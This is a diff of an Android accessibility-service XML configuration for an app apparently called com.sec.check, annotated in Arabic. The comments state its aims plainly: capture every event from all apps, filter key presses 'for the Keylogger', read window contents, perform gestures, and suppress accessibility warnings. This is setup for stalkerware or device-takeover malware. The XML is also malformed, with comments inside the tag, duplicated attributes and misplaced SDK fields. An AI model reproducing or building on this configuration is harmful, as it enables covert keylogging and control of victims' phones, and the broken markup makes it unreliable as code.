@@ -1,14 +1,88 @@
 <?xml version="1.0" encoding="utf-8"?>
-<accessibility-service
-    xmlns:android="http://schemas.android.com/apk/res/android"
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+
+    <!-- ============================================================ -->
+    <!-- ★★★ إعدادات Accessibility Service — أقوى إعدادات ممكنة ★★★ -->
+    <!-- ============================================================ -->
+
+    <!-- ★★ اسم الحدث: استقبل كل الأحداث ★★ -->
     android:accessibilityEventTypes="typeAllMask"
+
+    <!-- ★★ نوع التغذية الراجعة: كل الأنواع ★★ -->
     android:accessibilityFeedbackType="feedbackAllMask"
-    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents|flagRetrieveInteractiveWindows|flagReportViewIds"
+
+    <!-- ★★ الأعلام (Flags): تمكين كل الميزات ★★ -->
+    android:accessibilityFlags="
+        flagDefault|
+        flagIncludeNotImportantViews|
+        flagRequestTouchExplorationMode|
+        flagRequestFilterKeyEvents|
+        flagRetrieveInteractiveWindows|
+        flagReportViewIds|
+        flagRequestEnhancedWebAccessibility|
+        flagRequestAccessibilityButton|
+        flagRequestShortcutWarningDialogSpokenFeedback|
+        flagSendMotionEvents|
+        flagRequestMultiFingerGestures|
+        flagRequestTwoFingerPassthrough|
+        flagRequestGenericMotionEvents
+    "
+
+    <!-- ★★ السماح بأداء الإيماءات (gestures) ★★ -->
     android:canPerformGestures="true"
+
+    <!-- ★★ السماح بقراءة محتوى النوافذ ★★ -->
     android:canRetrieveWindowContent="true"
+
+    <!-- ★★ السماح بطلب web accessibility محسّن ★★ -->
     android:canRequestEnhancedWebAccessibility="true"
+
+    <!-- ★★ السماح بفلترة ضغطات المفاتيح (للـ Keylogger) ★★ -->
     android:canRequestFilterKeyEvents="true"
-    android:notificationTimeout="100"
+
+    <!-- ★★ السماح بالتحكم في التكبير ★★ -->
+    android:canControlMagnification="true"
+
+    <!-- ★★ السماح بالتكبير ★★ -->
+    android:canRequestTouchExplorationMode="true"
+
+    <!-- ★★ وقت الانتظار بين الأحداث (مللي ثانية) ★★ -->
+    android:notificationTimeout="50"
+
+    <!-- ★★ الوصف — بيظهر في الإعدادات ★★ -->
     android:description="@string/app_name"
+
+    <!-- ★★ الحزم المراقبة — فارغ يعني الكل ★★ -->
     android:packageNames=""
-    android:settingsActivity="com.sec.check.MainActivity" />
+
+    <!-- ★★ Activity الإعدادات ★★ -->
+    android:settingsActivity="com.sec.check.MainActivity"
+
+    <!-- ★★ Summary ★★ -->
+    android:summary="@string/app_name"
+
+    <!-- ★★ يمكن طلب إيماءات متعددة ★★ -->
+    android:canRequestMultiFingerGestures="true"
+
+    <!-- ★★ يمكن طلب إيماءات بالإصبعين ★★ -->
+    android:canRequestTwoFingerPassthrough="true"
+
+    <!-- ★★ استقبل أحداث الإيماءات العامة ★★ -->
+    android:canRequestGenericMotionEvents="true"
+
+    <!-- ★★ يمكن استخدام الإيماءات ★★ -->
+    android:canRequestTouchExplorationMode="true"
+
+    <!-- ★★ الوصول للنوافذ التفاعلية ★★ -->
+    android:accessibilityFlags="flagRetrieveInteractiveWindows"
+
+    <!-- ★★ الحد الأدنى للـ API ★★ -->
+    android:minSdkVersion="16"
+
+    <!-- ★★ الهدف ★★ -->
+    android:targetSdkVersion="33"
+
+    <!-- ★★ تعطيل التحذيرات ★★ -->
+    android:isAccessibilityTool="false"
+
+    />
